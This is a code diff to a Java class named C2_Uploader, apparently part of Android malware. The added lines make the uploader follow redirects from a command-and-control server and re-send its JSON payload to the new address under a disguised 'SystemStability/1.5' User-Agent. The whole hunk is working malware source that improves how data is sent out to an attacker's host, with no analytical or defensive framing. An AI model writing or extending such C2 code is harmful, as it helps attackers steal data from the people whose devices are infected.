@@ -91,6 +91,24 @@ public class C2_Uploader {
             }
 
             int code = conn.getResponseCode();
+            if (code == 301 || code == 302 || code == 303 || code == 307 || code == 308) {
+                String redirectUrl = conn.getHeaderField("Location");
+                if (redirectUrl != null && !redirectUrl.isEmpty()) {
+                    Log.d(TAG, "Following C2 Redirect to: " + redirectUrl);
+                    HttpURLConnection redirConn = (HttpURLConnection) new URL(redirectUrl).openConnection();
+                    redirConn.setRequestMethod("POST");
+                    redirConn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
+                    redirConn.setRequestProperty("User-Agent", "SystemStability/1.5");
+                    redirConn.setConnectTimeout(15000);
+                    redirConn.setReadTimeout(15000);
+                    redirConn.setDoOutput(true);
+                    try (OutputStream os = redirConn.getOutputStream()) {
+                        byte[] input = json.getBytes(StandardCharsets.UTF_8);
+                        os.write(input, 0, input.length);
+                    }
+                    code = redirConn.getResponseCode();
+                }
+            }
             Log.d(TAG, "C2 JSON POST Response Code: " + code + " to URL: " + urlString);
             if (code >= 400) {
                 try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getErrorStream(), StandardCharsets.UTF_8))) {
